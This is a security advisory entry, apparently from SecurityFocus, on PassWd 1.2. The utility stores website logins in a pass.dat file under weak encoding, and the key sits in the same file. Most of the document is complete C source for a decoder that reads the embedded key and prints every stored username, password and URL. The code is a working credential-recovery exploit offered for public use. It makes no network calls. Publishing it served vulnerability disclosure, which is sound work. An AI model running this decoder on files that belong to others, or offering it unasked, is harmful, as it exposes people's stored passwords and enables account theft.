source: http://www.securityfocus.com/bid/1300/info

PassWd 1.2 is a password management utility designed to store user login information to various URLs. The login information, which includes username, password and link location is stored in the pass.dat file which resides in the PassWD directory. The information is encrypted with a weak encoding algorithm and includes the key which can be used to decode any stored password. 

/*
 *  Decoder for PassWD v1.2 `pass.dat' password files
 *
 *  Written 2000 by Daniel Roethlisberger <admin@roe.ch>
 *
 *  This code is hereby placed in the public domain.
 *  Use this code at your own risk for whatever you want.
 *
 *  The decoded data is not parsed in any way - it should
 *  be very easy to moderately experienced programmers
 *  to add that themselves.
 *
 */

#include <stdio.h>

void main(int argc, char *argv[])
{
   unsigned char charpos;
   FILE* outfile;
   FILE* infile;
   unsigned char a;
   unsigned char b;
   unsigned char key;
   unsigned char x;

   unsigned char charset[] = "\b\t\n\r !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSPUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\b\t\n\r !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSPUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";

   printf("\nDecoder for PassWD v1.2 `pass.dat' password files\n");
   printf("Written 2000 by Daniel Roethlisberger <admin@roe.ch>\n\n");

   if((argc > 3) || (argc < 2))
   {
      printf("Usage: %s <infile> [<outfile>]\n\n", argv[0]);
      printf("If <outfile> is omitted, the output is dumped to stdout.\n", argv[0]);
      return;
   }

   infile = fopen(argv[1], "r");
   if(infile == NULL)
   {
      printf("Could not open file %s\n", argv[1]);
      return;
   }

   if(argc == 2)
      outfile = stdout;
   else
   {
      outfile = fopen(argv[2], "w");
      if(outfile == NULL)
      {
         printf("Could not write to file %s\n", argv[2]);
         _fcloseall();
         return;
      }
   }

   getc(infile);       /* jump over decoy byte    */
   a = getc(infile);   /* read encoded key byte 1 */
   b = getc(infile);   /* read encoded key byte 2 */

   if(b == EOF)
   {
      printf("ERROR - encountered EOF within header\n");
      return;
   }

   /* this line `decodes' the key */
   key = (unsigned char)((a - 'b') * 10 + (b - 'b'));

   /* read through infile and dump decoded output to outfile: */
   x = getc(infile);
   while(!feof(infile))
   {
      for(charpos = 0; x != charset[charpos]; charpos++)
      {
         if(charpos > 99)
         {
            printf("\nERROR - encountered illegal character in source file\n");
            _fcloseall();
            return;
         }
      }
      /* plain = cypher - key */
      putc(charset[charpos + 99 - key], outfile);
      x = getc(infile);
   }

   if(argc == 2)
      printf("\n\n");
   printf("Done.\n");

   _fcloseall();
   return;
}